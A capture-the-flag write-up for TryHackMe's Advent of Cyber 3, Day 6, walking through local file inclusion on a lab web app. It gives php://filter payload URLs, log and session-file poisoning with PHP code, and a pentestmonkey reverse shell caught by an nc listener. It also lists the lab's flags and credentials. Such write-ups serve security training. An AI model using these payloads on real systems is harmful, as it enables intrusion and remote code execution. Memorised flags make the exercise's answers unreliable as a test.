# Advent of Cyber - Day 6

Link: [Advent Of Cyber 3 on TryHackMe](https://tryhackme.com/room/adventofcyber3)

### Question 1

Deploy the attached VM and look around. What is the entry point for our web application?

Scan the endpoint with `nmap -sV -sC -vv $ip`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/1.png?raw=true)

Answer: `err`

### Question 2

Use the entry point to perform LFI to read the `/etc/flag` file. What is the flag?

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/2.png?raw=true)

Answer: `THM{d29e08941cf7fe41df55f1a7da6c4c06}`

### Question 3

Use the PHP filter technique to read the source code of the `index.php`. What is the $flag variable's value?

If we try the standard LFI bypass without a filter for `index.php` (url below), we encounter an error.

`http://$ip/index.php?err=php://filter/resource=index.php`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/3-1.png?raw=true)

The reason for this is that it's rendering the PHP instead of just displaying the text, and this is where the filter bypass using Base64 comes into play, using the following url: `http://$ip/index.php?err=php://filter/convert.base64-encode/resource=index.php`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/3-2.png?raw=true)

If we throw this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)), we get the following output, including our flag.

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/3-3.png?raw=true)

Answer: `THM{791d43d46018a0d89361dbf60d5d9eb8}`

### Question 4

McSkidy forgot his login credential. Can you help him to login in order to recover one of the server's passwords?

Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?

From the previous question's `index.php` file, we can see that there is another file at `./includes/creds.php`.

If we apply the same method as earlier, we can access it's contents at `http://$ip/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php`.

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/4-1.png?raw=true)

If we throw that in CyberChef, we get the following:

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/4-2.png?raw=true)

Answer: `McSkidy:A0C315Aw3s0m`

### Question 5

Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server? 

If we go to the original URL, `http://$ip/index.php?err=error.txt` we can click the `login` link at the bottom.

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/5-1.png?raw=true)

We then go to "Password Recovery", and we can see our password/flag:

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/5-2.png?raw=true)

`THM{552f313b52e3c3dbf5257d8c6db7f6f1}`

### Question 6

The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at `./includes/logs/app_access.log`.

`curl -A "<?php phpinfo();?>" http://$ip.p.thmlabs.com/login.php` 

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/6-1.png?raw=true)

`http://$ip/index.php?err=php://filter/resource=includes/logs/app_access.log`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/6-2.png?raw=true)

Answer: `lfi-aoc-awesome-59aedca683fff9261263bb084880c965`

### Question 7

Bonus: The current PHP configuration stores the PHP session files in /tmp. Use the LFI to call the PHP session file to get your PHP code executed.

First, we need to discover our session ID, either by finding it among the `phpinfo` results from the previous question (search for `SESSION`) or by going to the Web Developer tools and checking storage.

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-1.png?raw=true)

We need two pages open:

- `http://$ip/login.php`
- `http://$ip/index.php?err=php://filter/resource=/tmp/sess_$sessid`

In the first, add `<?php phpinfo(); ?>` to the login username, then press enter.

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-2.png?raw=true)

Then go to the second page and refresh.

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-3.png?raw=true)

Now. This is fun and all, but maybe we could go further? Maybe we could penetrate the box?

Let us look for a PHP reverse shell program!

We can use [this one](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) from pentestmonkey!

Let's just paste it (with the correct IP) into the first page and start a netcat listener (`nc -lvnp 1234`)!

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-4.png?raw=true)

And refresh the second page...

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-5.png?raw=true)

And look at our listener!

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-6.png?raw=true)

Well? Why isn't it working?

Well, it has to do with the login field! It's putting everything on the same line! And the default `php-reverse-shell.php` is full of comments, so if it's plonking everything on the same line, then everything after the first comment will end up commented!

So if we take the time to strip all the comments from the file, we can then copy that into the login form:

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-7.png?raw=true)

The second page will then timeout (as expected when spawning a shell):

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-8.png?raw=true)

And our listener will get some input!

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day6/7-9.png?raw=true)

(This falls under the umbrella of RCE, but there are no flags on the machine, so you can just log off afterwards)

Answer: `No answer needed`